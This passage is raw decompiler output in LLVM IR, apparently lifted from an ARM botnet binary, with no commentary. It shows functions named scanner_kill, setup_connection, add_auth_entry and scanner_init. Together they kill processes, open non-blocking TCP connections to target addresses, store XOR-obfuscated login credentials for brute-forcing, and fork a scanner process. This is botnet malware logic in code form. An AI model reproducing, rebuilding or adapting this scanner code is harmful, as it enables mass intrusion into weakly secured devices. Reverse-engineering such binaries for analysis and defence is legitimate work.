  br label %dec_label_pc_fac8.backedge

; uselistorder directives
  uselistorder i32 %v3_fc80, { 1, 0 }
  uselistorder i32 %v4_fc70, { 1, 0, 2 }
  uselistorder i32 %v11_fc50, { 1, 0, 2 }
  uselistorder i32 %v3_fc48, { 1, 0 }
  uselistorder i32 %v5_fc08, { 1, 2, 0 }
  uselistorder i32 %v3_fc00, { 1, 0 }
  uselistorder i32 %v4_fbf0, { 1, 0, 2 }
  uselistorder i32 %v2_fbd4, { 1, 0 }
  uselistorder i32 %v3_fb54, { 0, 2, 1 }
  uselistorder i32 %v1_fbd465, { 1, 0 }
  uselistorder i32 %v1_fbd0, { 1, 2, 0 }
  uselistorder i32 %v2_fbc4, { 1, 0 }
  uselistorder i32 %v3_fae8, { 0, 2, 1 }
  uselistorder i32 %v1_fbc450, { 1, 0 }
  uselistorder i32 %v1_fbc0, { 1, 2, 0 }
  uselistorder i1 %v7_fad0, { 1, 0 }
  uselistorder i32 %v1_fac8, { 1, 0 }
  uselistorder i32 %storemerge29, { 1, 0 }
  uselistorder i32 %v3_fb7c, { 0, 2, 1 }
  uselistorder i32 %v2_fb78, { 1, 2, 0 }
  uselistorder i32 %v0_fbcc, { 2, 0, 1 }
  uselistorder i32 %v1_fbd4, { 1, 2, 0 }
  uselistorder i32 %v3_fb5c28, { 1, 0 }
  uselistorder i32 %v3_fb5426, { 1, 0, 2 }
  uselistorder i32 %v1_fb40, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v2_fb2c, { 0, 1, 2, 4, 3, 6, 5, 7, 9, 8, 10 }
  uselistorder i32 %v3_fb10, { 0, 2, 1 }
  uselistorder i32 %v2_fb0c, { 1, 2, 0 }
  uselistorder i32 %v0_fbbc, { 2, 0, 1 }
  uselistorder i32 %v1_fbc4, { 1, 2, 0 }
  uselistorder i32 %v3_faf022, { 1, 0 }
  uselistorder i32 %v3_fae820, { 1, 0, 2 }
  uselistorder i32 %v0_fb2c143, { 3, 0, 1, 2 }
  uselistorder i32 %v3_fad4142, { 1, 0 }
  uselistorder i1 %v7_fad0141, { 1, 0 }
  uselistorder i32 %v1_fac8134, { 1, 0 }
  uselistorder i1 %v9_faa4, { 1, 0 }
  uselistorder i32 %v0_fa64, { 1, 0 }
  uselistorder i32 %v0_fa58, { 1, 0, 2 }
  uselistorder i32 %v0_fa48, { 1, 0 }
  uselistorder i32 %v0_fa20, { 1, 0 }
  uselistorder i32 %v1_f9d4, { 1, 0, 2 }
  uselistorder i1 %v7_f9cc, { 1, 0 }
  uselistorder i32 %v5_f9c8, { 1, 0, 2 }
  uselistorder i32 %v1_f990, { 1, 0 }
  uselistorder i32 %v3_f97c, { 1, 0 }
  uselistorder i32 %v0_f974, { 1, 0 }
  uselistorder i32 %v1_f968, { 1, 2, 0 }
  uselistorder i1 %v7_f920, { 1, 0 }
  uselistorder i32 %v4_f91c, { 1, 0, 2 }
  uselistorder i1 %v7_f904, { 1, 0 }
  uselistorder i32 %v3_f900, { 1, 0, 2 }
  uselistorder i1 %v7_f8e8, { 1, 0 }
  uselistorder i32 %v3_f8e4, { 2, 1, 0, 3 }
  uselistorder i1 %v7_f8cc, { 2, 1, 0 }
  uselistorder i32 %v1_f8d0, { 1, 0 }
  uselistorder i32 %v2_f980, { 1, 0 }
  uselistorder i32 %v2_f958, { 1, 0, 2 }
  uselistorder i16 %v5_f874, { 1, 0 }
  uselistorder i32 %v2_f870, { 1, 0, 2, 3 }
  uselistorder i32 %v6_f85c, { 1, 2, 0 }
  uselistorder i64 %v5_f858, { 0, 2, 1 }
  uselistorder i32 %v1_f844, { 1, 0, 2 }
  uselistorder i32 %v1_f7fc, { 1, 0 }
  uselistorder i32 %v1_f7f8, { 1, 2, 0 }
  uselistorder i32 %v2_f7f4, { 1, 0 }
  uselistorder i1 %v8_f7e0, { 1, 0 }
  uselistorder i32 %v2_f7b8, { 1, 0, 2 }
  uselistorder i16* %stack_var_-2244, { 1, 0 }
  uselistorder i32* %stack_var_-68, { 0, 2, 1 }
  uselistorder i16* %stack_var_-4292, { 1, 0 }
  uselistorder i16 %tmp79, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 4, 1, 3, 2 }
  uselistorder i32* %r4.global-to-local, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 16, 11, 14, 12, 13, 15, 17, 36, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 35, 33, 34, 37 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 9, 12, 8, 27, 10, 11, 26, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 24, 23, 25 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 4, 6, 3, 21, 5, 20, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 23, 22, 24, 19 }
  uselistorder i32* %r0.global-to-local, { 1, 5, 2, 3, 4, 11, 6, 8, 7, 9, 10, 12, 15, 13, 14, 17, 16, 20, 18, 19, 21, 22, 24, 23, 26, 25, 27, 29, 28, 30, 33, 32, 31, 35, 34, 36, 37, 38, 39, 40, 41, 42, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 8, 2, 13, 3, 4, 14, 5, 6, 7, 34, 9, 10, 11, 12, 33, 36, 15, 16, 17, 18, 19, 20, 21, 22, 23, 35, 24, 25, 26, 27, 32, 29, 30, 28, 31, 37 }
  uselistorder i32 (i32)* @sleep, { 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_fb54.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_fae8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_fac8.backedge, { 1, 0 }
  uselistorder label %bb122, { 0, 2, 1 }
  uselistorder label %dec_label_pc_fb64, { 1, 0 }
  uselistorder label %dec_label_pc_fb64.preheader, { 1, 0 }
  uselistorder label %bb120, { 1, 0 }
  uselistorder label %dec_label_pc_faf8, { 1, 0 }
  uselistorder label %dec_label_pc_faf8.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_fadc, { 1, 0 }
  uselistorder label %dec_label_pc_fa64, { 1, 0 }
  uselistorder label %dec_label_pc_fa50, { 5, 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_fa30, { 2, 1, 4, 0, 3 }
  uselistorder label %bb118, { 1, 0 }
  uselistorder label %bb115, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
  uselistorder label %dec_label_pc_f7d8, { 1, 0 }
}

define i32 @scanner_kill(i32 %arg1) local_unnamed_addr {
entry:
  %v2_fca0 = load i32, i32* @global_var_26e74.184, align 4
  %v2_fca8 = call i32 @kill(i32 %v2_fca0, i32 9)
  ret i32 %v2_fca8

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 14, 13, 12, 11, 10, 0, 9, 8, 7, 6, 5, 4, 3, 2, 1 }
}

define i32 @setup_connection() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_fcbc = load i32, i32* @r4, align 4
  store i32 %v3_fcbc, i32* %stack_var_-16, align 4
  %v6_fcbc = load i32, i32* @r5, align 4
  %v9_fcbc = load i32, i32* @r6, align 4
  %v12_fcbc = load i32, i32* @lr, align 4
  %v0_fcc0 = load i32, i32* @r0, align 4
  store i32 %v0_fcc0, i32* @r5, align 4
  %v1_fcc4 = add i32 %v0_fcc0, 4
  %v2_fcc4 = inttoptr i32 %v1_fcc4 to i32*
  %v3_fcc4 = load i32, i32* %v2_fcc4, align 4
  store i32 %v3_fcc4, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i32 0, i32* %stack_var_-32, align 4
  store i32 64744, i32* @lr, align 4
  %v1_fce4 = icmp ne i32 %v3_fcc4, -1
  call void @__pseudo_cond_branch(i1 %v1_fce4, i32 ptrtoint (i32* @global_var_16390.35 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_fcf0 = load i32, i32* @r6, align 4
  store i32 %v0_fcf0, i32* %r2.global-to-local, align 4
  %v3_fcf4 = call i32 @socket(i32 2, i32 1, i32 %v0_fcf0)
  store i32 %v3_fcf4, i32* %r0.global-to-local, align 4
  %v7_fcf8 = icmp eq i32 %v3_fcf4, -1
  %v1_fcfc = load i32, i32* @r5, align 4
  %v2_fcfc = add i32 %v1_fcfc, 4
  %v3_fcfc = inttoptr i32 %v2_fcfc to i32*
  store i32 %v3_fcf4, i32* %v3_fcfc, align 4
  br i1 %v7_fcf8, label %entry.dec_label_pc_fd74_crit_edge, label %dec_label_pc_fd04

entry.dec_label_pc_fd74_crit_edge:                ; preds = %entry
  %v1_fd7c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fd74

dec_label_pc_fd04:                                ; preds = %entry
  %v2_fcc8 = ptrtoint i32* %stack_var_-32 to i32
  %v0_fd04 = load i32, i32* @r5, align 4
  %v1_fd04 = add i32 %v0_fd04, 28
  store i32 %v1_fd04, i32* %r0.global-to-local, align 4
  %v0_fd08 = load i32, i32* @r6, align 4
  %v2_fd08 = add i32 %v0_fd04, 24
  %v3_fd08 = inttoptr i32 %v2_fd08 to i32*
  store i32 %v0_fd08, i32* %v3_fd08, align 4
  %v2_fd10 = call i32 @util_zero(i32 %v1_fd04, i32 512)
  store i32 %v2_fd10, i32* %r0.global-to-local, align 4
  %v0_fd14 = load i32, i32* @r5, align 4
  %v1_fd14 = add i32 %v0_fd14, 4
  %v2_fd14 = inttoptr i32 %v1_fd14 to i32*
  %v3_fd14 = load i32, i32* %v2_fd14, align 4
  store i32 %v3_fd14, i32* @r4, align 4
  %v0_fd18 = load i32, i32* @r6, align 4
  store i32 %v0_fd18, i32* @r2, align 4
  store i32 %v3_fd14, i32* %r0.global-to-local, align 4
  %v2_fd24 = call i32 @__libc_fcntl(i32 %v3_fd14, i32 3)
  %v1_fd2c = or i32 %v2_fd24, 2048
  store i32 %v1_fd2c, i32* @r2, align 4
  %v0_fd30 = load i32, i32* @r4, align 4
  store i32 %v0_fd30, i32* %r0.global-to-local, align 4
  %v2_fd34 = call i32 @__libc_fcntl(i32 %v0_fd30, i32 4)
  store i32 %v2_fd34, i32* %r0.global-to-local, align 4
  %v2_fd3c = load i32, i32* @global_var_24388.186, align 4
  store i32 %v2_fd3c, i32* %r2.global-to-local, align 4
  %v1_fd44 = load i32, i32* @r5, align 4
  %v2_fd44 = add i32 %v1_fd44, 12
  %v3_fd44 = inttoptr i32 %v2_fd44 to i32*
  store i32 1, i32* %v3_fd44, align 4
  store i32 2, i32* %stack_var_-32, align 4
  %v0_fd50 = load i32, i32* %r2.global-to-local, align 4
  %v1_fd50 = load i32, i32* @r5, align 4
  %v2_fd50 = add i32 %v1_fd50, 8
  %v3_fd50 = inttoptr i32 %v2_fd50 to i32*
  store i32 %v0_fd50, i32* %v3_fd50, align 4
  %v0_fd54 = load i32, i32* @r5, align 4
  %v1_fd58 = add i32 %v0_fd54, 4
  %v2_fd58 = inttoptr i32 %v1_fd58 to i32*
  %v3_fd58 = load i32, i32* %v2_fd58, align 4
  store i32 %v3_fd58, i32* %r0.global-to-local, align 4
  %v1_fd5c = add i32 %v0_fd54, 20
  %v2_fd5c = inttoptr i32 %v1_fd5c to i16*
  %v3_fd5c = load i16, i16* %v2_fd5c, align 2
  %v4_fd5c = zext i16 %v3_fd5c to i32
  store i32 %v4_fd5c, i32* @r5, align 4
  store i32 16, i32* %r2.global-to-local, align 4
  %v3_fd70 = call i32 @__libc_connect(i32 %v3_fd58, i32 %v2_fcc8, i32 16)
  store i32 %v3_fd70, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_fd74

dec_label_pc_fd74:                                ; preds = %entry.dec_label_pc_fd74_crit_edge, %dec_label_pc_fd04
  %v1_fd7c = phi i32 [ %v1_fd7c.pre, %entry.dec_label_pc_fd74_crit_edge ], [ %v3_fd70, %dec_label_pc_fd04 ]
  %v2_fd78 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_fd78, i32* @r4, align 4
  store i32 %v6_fcbc, i32* @r5, align 4
  store i32 %v9_fcbc, i32* @r6, align 4
  store i32 %v12_fcbc, i32* @lr, align 4
  ret i32 %v1_fd7c

; uselistorder directives
  uselistorder i32 %v3_fcf4, { 1, 0, 2 }
  uselistorder i32* %stack_var_-32, { 0, 2, 1 }
  uselistorder i32* %r0.global-to-local, { 1, 0, 3, 2, 4, 6, 5, 9, 10, 8, 7 }
  uselistorder i32 (i32, i32)* @util_zero, { 7, 14, 13, 12, 11, 10, 9, 8, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_fd74, { 1, 0 }
}

define i32 @add_auth_entry(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_fd84 = load i32, i32* @r4, align 4
  %v6_fd84 = load i32, i32* @r5, align 4
  %v9_fd84 = load i32, i32* @r6, align 4
  %v12_fd84 = load i32, i32* @r7, align 4
  %v15_fd84 = load i32, i32* @r8, align 4
  %v18_fd84 = load i32, i32* @sb, align 4
  %v21_fd84 = load i32, i32* @sl, align 4
  %v24_fd84 = load i32, i32* @fp, align 4
  store i32 ptrtoint (i32* @global_var_24354.188 to i32), i32* @fp, align 4
  %v2_fd8c = load i32, i32* @global_var_24354.188, align 4
  store i32 ptrtoint (i32* @global_var_24380.190 to i32), i32* @sl, align 4
  %v1_fd98 = add i32 %v2_fd8c, 1
  store i32 %v1_fd98, i32* %r3.global-to-local, align 4
  store i32 %arg1, i32* @r5, align 4
  %v2_fda4 = load i32, i32* @global_var_24380.190, align 4
  store i32 %v2_fda4, i32* %r0.global-to-local, align 4
  %v3_fda8 = mul i32 %v1_fd98, 16
  store i32 %v3_fda8, i32* %r1.global-to-local, align 4
  %v4_fdb0 = inttoptr i32 %v2_fda4 to i32*
  %v5_fdb0 = call i32 @realloc(i32* %v4_fdb0, i32 %v3_fda8, i32 %arg3, i32 %v1_fd98)
  %v2_fdb4 = load i32, i32* @global_var_24354.188, align 4
  store i32 %v2_fdb4, i32* %r2.global-to-local, align 4
  store i32 %v5_fdb0, i32* @r8, align 4
  %v0_fdbc = load i32, i32* @r5, align 4
  store i32 %v0_fdbc, i32* %r0.global-to-local, align 4
  %v1_fdc4 = load i32, i32* @sl, align 4
  %v2_fdc4 = inttoptr i32 %v1_fdc4 to i32*
  store i32 %v5_fdb0, i32* %v2_fdc4, align 4
  %v1_fdc8 = inttoptr i32 %v0_fdbc to i8*
  %v2_fdc8 = call i32 @util_strlen(i8* %v1_fdc8)
  %sext = mul i32 %v2_fdc8, 16777216
  %v1_fdcc = sdiv i32 %sext, 16777216
  %v2_fdcc = add nsw i32 %v1_fdcc, 1
  store i32 %v2_fdcc, i32* @r4, align 4
  store i32 %v1_fdcc, i32* @r7, align 4
  store i32 %v2_fdcc, i32* @r0, align 4
  %v0_fdd8 = call i32 @malloc()
  store i32 %v0_fdd8, i32* %r0.global-to-local, align 4
  %v0_fddc = load i32, i32* @r5, align 4
  store i32 %v0_fddc, i32* %r1.global-to-local, align 4
  %v0_fde0 = load i32, i32* @r4, align 4
  store i32 %v0_fde0, i32* %r2.global-to-local, align 4
  store i32 %v0_fdd8, i32* %r6.global-to-local, align 4
  %v3_fde8 = call i32 @util_memcpy(i32 %v0_fdd8, i32 %v0_fddc, i32 %v0_fde0)
  store i32 %v3_fde8, i32* %r0.global-to-local, align 4
  %v0_fdec = load i32, i32* @r7, align 4
  %tmp22 = icmp slt i32 %v0_fdec, 1
  %extract.t6 = trunc i32 %v0_fdec to i8
  br i1 %tmp22, label %dec_label_pc_fe10, label %dec_label_pc_fdf4

dec_label_pc_fdf4:                                ; preds = %entry
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fdf8

dec_label_pc_fdf8:                                ; preds = %dec_label_pc_fdf8, %dec_label_pc_fdf4
  %v2_fe00 = phi i32 [ %v1_fe04, %dec_label_pc_fdf8 ], [ 0, %dec_label_pc_fdf4 ]
  %v1_fdf8 = load i32, i32* %r6.global-to-local, align 4
  %v2_fdf8 = add i32 %v1_fdf8, %v2_fe00
  %v3_fdf8 = inttoptr i32 %v2_fdf8 to i8*
  %v4_fdf8 = load i8, i8* %v3_fdf8, align 1
  %v6_fdf8 = zext i8 %v4_fdf8 to i32
  %v1_fdfc = xor i32 %v6_fdf8, 34
  store i32 %v1_fdfc, i32* %r3.global-to-local, align 4
  %v1_fe00 = trunc i32 %v1_fdfc to i8
  store i8 %v1_fe00, i8* %v3_fdf8, align 1
  %v0_fe04 = load i32, i32* %r2.global-to-local, align 4
  %v1_fe04 = add i32 %v0_fe04, 1
  store i32 %v1_fe04, i32* %r2.global-to-local, align 4
  %v1_fe08 = load i32, i32* @r7, align 4
  %v9_fe08 = icmp eq i32 %v1_fe04, %v1_fe08
  br i1 %v9_fe08, label %dec_label_pc_fe10.loopexit, label %dec_label_pc_fdf8

dec_label_pc_fe10.loopexit:                       ; preds = %dec_label_pc_fdf8
  %extract.t = trunc i32 %v1_fe04 to i8
  br label %dec_label_pc_fe10

dec_label_pc_fe10:                                ; preds = %dec_label_pc_fe10.loopexit, %entry
  %v0_fe20.off0 = phi i8 [ %extract.t, %dec_label_pc_fe10.loopexit ], [ %extract.t6, %entry ]
  %v2_fe10 = load i32, i32* @global_var_24354.188, align 4
  %v2_fe14 = load i32, i32* @global_var_24380.190, align 4
  %v3_fe18 = mul i32 %v2_fe10, 16
  store i32 %v3_fe18, i32* @sb, align 4
  %v2_fe1c = add i32 %v2_fe14, %v3_fe18
  store i32 %v2_fe1c, i32* %r2.global-to-local, align 4
  %v3_fe20 = add i32 %v2_fe1c, 12
  %v4_fe20 = inttoptr i32 %v3_fe20 to i8*
  store i8 %v0_fe20.off0, i8* %v4_fe20, align 1
  store i32 %arg2, i32* %r0.global-to-local, align 4
  store i32 %v2_fdb4, i32* %r3.global-to-local, align 4
  %v0_fe2c = load i32, i32* %r6.global-to-local, align 4
  %v1_fe2c = load i32, i32* @r8, align 4
  %v5_fe2c = mul i32 %v2_fdb4, 16
  %v6_fe2c = add i32 %v1_fe2c, %v5_fe2c
  %v7_fe2c = inttoptr i32 %v6_fe2c to i32*
  store i32 %v0_fe2c, i32* %v7_fe2c, align 4
  %v2_fe30 = load i32, i32* @global_var_24380.190, align 4
  store i32 %v2_fe30, i32* @r7, align 4
  %v1_fe34 = inttoptr i32 %arg2 to i8*
  %v2_fe34 = call i32 @util_strlen(i8* %v1_fe34)
  %sext1 = mul i32 %v2_fe34, 16777216
  %v1_fe38 = sdiv i32 %sext1, 16777216
  %v2_fe38 = add nsw i32 %v1_fe38, 1
  store i32 %v2_fe38, i32* @r4, align 4
  store i32 %v1_fe38, i32* @r6, align 4
  store i32 %v2_fe38, i32* @r0, align 4
  %v0_fe44 = call i32 @malloc()
  store i32 %v0_fe44, i32* %r0.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %v0_fe4c = load i32, i32* @r4, align 4
  store i32 %v0_fe4c, i32* %r2.global-to-local, align 4
  store i32 %v0_fe44, i32* %r5.global-to-local, align 4
  %v3_fe54 = call i32 @util_memcpy(i32 %v0_fe44, i32 %arg2, i32 %v0_fe4c)
  store i32 %v3_fe54, i32* %r0.global-to-local, align 4
  %v0_fe58 = load i32, i32* @r6, align 4
  %tmp23 = icmp slt i32 %v0_fe58, 1
  %extract.t8 = trunc i32 %v0_fe58 to i8
  br i1 %tmp23, label %dec_label_pc_fe7c, label %dec_label_pc_fe60

dec_label_pc_fe60:                                ; preds = %dec_label_pc_fe10
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_fe64

dec_label_pc_fe64:                                ; preds = %dec_label_pc_fe64, %dec_label_pc_fe60
  %v2_fe6c = phi i32 [ %v1_fe70, %dec_label_pc_fe64 ], [ 0, %dec_label_pc_fe60 ]
  %v1_fe64 = load i32, i32* %r5.global-to-local, align 4
  %v2_fe64 = add i32 %v1_fe64, %v2_fe6c
  %v3_fe64 = inttoptr i32 %v2_fe64 to i8*
  %v4_fe64 = load i8, i8* %v3_fe64, align 1
  %v6_fe64 = zext i8 %v4_fe64 to i32
  %v1_fe68 = xor i32 %v6_fe64, 34
  store i32 %v1_fe68, i32* %r3.global-to-local, align 4
  %v1_fe6c = trunc i32 %v1_fe68 to i8
  store i8 %v1_fe6c, i8* %v3_fe64, align 1
  %v0_fe70 = load i32, i32* %r2.global-to-local, align 4
  %v1_fe70 = add i32 %v0_fe70, 1
  store i32 %v1_fe70, i32* %r2.global-to-local, align 4
  %v1_fe74 = load i32, i32* @r6, align 4
  %v9_fe74 = icmp eq i32 %v1_fe70, %v1_fe74
  br i1 %v9_fe74, label %dec_label_pc_fe7c.loopexit, label %dec_label_pc_fe64

dec_label_pc_fe7c.loopexit:                       ; preds = %dec_label_pc_fe64
  %extract.t7 = trunc i32 %v1_fe70 to i8
  br label %dec_label_pc_fe7c

dec_label_pc_fe7c:                                ; preds = %dec_label_pc_fe7c.loopexit, %dec_label_pc_fe10
  %v0_fe8c.off0 = phi i8 [ %extract.t7, %dec_label_pc_fe7c.loopexit ], [ %extract.t8, %dec_label_pc_fe10 ]
  %v2_fe7c = load i32, i32* @global_var_24354.188, align 4
  store i32 %v2_fe7c, i32* %r0.global-to-local, align 4
  %v2_fe80 = load i32, i32* @global_var_24380.190, align 4
  %v3_fe84 = mul i32 %v2_fe7c, 16
  store i32 %v3_fe84, i32* %r1.global-to-local, align 4
  %v2_fe88 = or i32 %v3_fe84, 13
  %v3_fe8c = add i32 %v2_fe88, %v2_fe80
  %v4_fe8c = inttoptr i32 %v3_fe8c to i8*
  store i8 %v0_fe8c.off0, i8* %v4_fe8c, align 1
  store i32 ptrtoint (i16** @global_var_24384.192 to i32), i32* %r4.global-to-local, align 4
  %v2_fe98 = load i16, i16* bitcast (i16** @global_var_24384.192 to i16*), align 4
  %v3_fe98 = zext i16 %v2_fe98 to i32
  store i32 %v3_fe98, i32* %lr.global-to-local, align 4
  %v2_fea0 = load i32, i32* @global_var_24380.190, align 4
  store i32 %v2_fea0, i32* %r2.global-to-local, align 4
  %v0_fea8 = load i32, i32* %r1.global-to-local, align 4
  %v2_fea8 = add i32 %v0_fea8, %v2_fea0
  store i32 %v2_fea8, i32* %r1.global-to-local, align 4
  store i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_24384.192 to i32), i32 16), i32 16), i32* %r3.global-to-local, align 4
  %v0_feb0 = load i32, i32* @sb, align 4
  %v1_feb0 = load i32, i32* @r7, align 4
  %v2_feb0 = add i32 %v1_feb0, %v0_feb0
  store i32 %v2_feb0, i32* %ip.global-to-local, align 4
  %v0_feb4 = load i32, i32* %r0.global-to-local, align 4
  %v1_feb4 = add i32 %v0_feb4, 1
  store i32 %v1_feb4, i32* %r0.global-to-local, align 4
  %v3_feb8 = add i32 %v2_fea8, 10
  %v4_feb8 = inttoptr i32 %v3_feb8 to i16*
  store i16 trunc (i32 lshr (i32 shl (i32 ptrtoint (i16** @global_var_24384.192 to i32), i32 16), i32 16) to i16), i16* %v4_feb8, align 2
  %v0_febc = load i32, i32* %lr.global-to-local, align 4
  %v1_febc = trunc i32 %v0_febc to i16
  %v2_febc = load i32, i32* %r1.global-to-local, align 4
  %v3_febc = add i32 %v2_febc, 8
  %v4_febc = inttoptr i32 %v3_febc to i16*
  store i16 %v1_febc, i16* %v4_febc, align 2
  %v0_fec0 = load i32, i32* %r5.global-to-local, align 4
  %v1_fec0 = load i32, i32* %ip.global-to-local, align 4
  %v2_fec0 = add i32 %v1_fec0, 4
  %v3_fec0 = inttoptr i32 %v2_fec0 to i32*
  store i32 %v0_fec0, i32* %v3_fec0, align 4
  %v1_fec4 = load i32, i32* @fp, align 4
  %v2_fec4 = inttoptr i32 %v1_fec4 to i32*
  store i32 %v1_feb4, i32* %v2_fec4, align 4
  %v0_fec8 = load i32, i32* %r3.global-to-local, align 4
  %v1_fec8 = trunc i32 %v0_fec8 to i16
  %v2_fec8 = load i32, i32* %r4.global-to-local, align 4
  %v3_fec8 = inttoptr i32 %v2_fec8 to i16*
  store i16 %v1_fec8, i16* %v3_fec8, align 2
  store i32 %v3_fd84, i32* @r4, align 4
  store i32 %v6_fd84, i32* @r5, align 4
  store i32 %v9_fd84, i32* @r6, align 4
  store i32 %v12_fd84, i32* @r7, align 4
  store i32 %v15_fd84, i32* @r8, align 4
  store i32 %v18_fd84, i32* @sb, align 4
  store i32 %v21_fd84, i32* @sl, align 4
  store i32 %v24_fd84, i32* @fp, align 4
  ret i32 %v1_feb4

; uselistorder directives
  uselistorder i32 %v3_fe84, { 1, 0 }
  uselistorder i32 %v1_fe70, { 0, 2, 3, 1 }
  uselistorder i32 %v0_fe44, { 1, 0, 2 }
  uselistorder i32 %v3_fe18, { 1, 0 }
  uselistorder i32 %v1_fe04, { 0, 2, 3, 1 }
  uselistorder i32 %v0_fdd8, { 1, 0, 2 }
  uselistorder i32 %v2_fdb4, { 1, 0, 2 }
  uselistorder i32 %v3_fda8, { 1, 0 }
  uselistorder i32 %v1_fd98, { 1, 0, 2 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 0 }
  uselistorder i32 (i8*)* @util_strlen, { 16, 17, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 18, 19, 20, 21, 22, 23, 15, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80 }
  uselistorder i32 %arg2, { 3, 2, 1, 0, 4 }
}

define i32 @scanner_init() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp298 = call i32 @__decompiler_undefined_function_0()
  %tmp302 = call i32 @__decompiler_undefined_function_0()
  %tmp303 = call i32 @__decompiler_undefined_function_0()
  %tmp304 = call i16 @__decompiler_undefined_function_1()
  %stack_var_-42 = alloca i32, align 4
  %stack_var_-77 = alloca i32, align 4
  %stack_var_-45 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-352 = alloca i32, align 4
  %stack_var_-224 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-96 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-1866 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v6_fee4 = load i32, i32* @r5, align 4
  %v9_fee4 = load i32, i32* @r6, align 4
  %v12_fee4 = load i32, i32* @r7, align 4
  %v15_fee4 = load i32, i32* @r8, align 4
  %v18_fee4 = load i32, i32* @sb, align 4
  %v21_fee4 = load i32, i32* @sl, align 4
  %v24_fee4 = load i32, i32* @fp, align 4
  %v0_fef0 = call i32 @__libc_fork()
  store i32 %v0_fef0, i32* %r0.global-to-local, align 4
  %v7_fef4 = icmp eq i32 %v0_fef0, -1
  %. = zext i1 %v7_fef4 to i32
  %tmp337 = icmp slt i32 %v0_fef0, 1
  %storemerge296 = select i1 %tmp337, i32 %., i32 1
  store i32 %storemerge296, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_26e74.184 to i32), i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_ff10 = icmp eq i32 %storemerge296, 0
  store i1 %v2_ff10, i1* %cpsr_z.global-to-local, align 1
  store i32 %v0_fef0, i32* @global_var_26e74.184, align 4
  br i1 %v2_ff10, label %dec_label_pc_ff2c, label %dec_label_pc_ff1c

dec_label_pc_ff1c:                                ; preds = %entry
  store i32 %v6_fee4, i32* @r5, align 4
  store i32 %v9_fee4, i32* @r6, align 4
  store i32 %v12_fee4, i32* @r7, align 4
  store i32 %v15_fee4, i32* @r8, align 4
  store i32 %v18_fee4, i32* @sb, align 4
  store i32 %v21_fee4, i32* @sl, align 4
  store i32 %v24_fee4, i32* @fp, align 4
  ret i32 %v0_fef0

dec_label_pc_ff2c:                                ; preds = %entry
  %v0_ff2c = call i32 @util_local_addr()
  store i32 %v0_ff2c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_26e50.101 to i32), i32* %r1.global-to-local, align 4
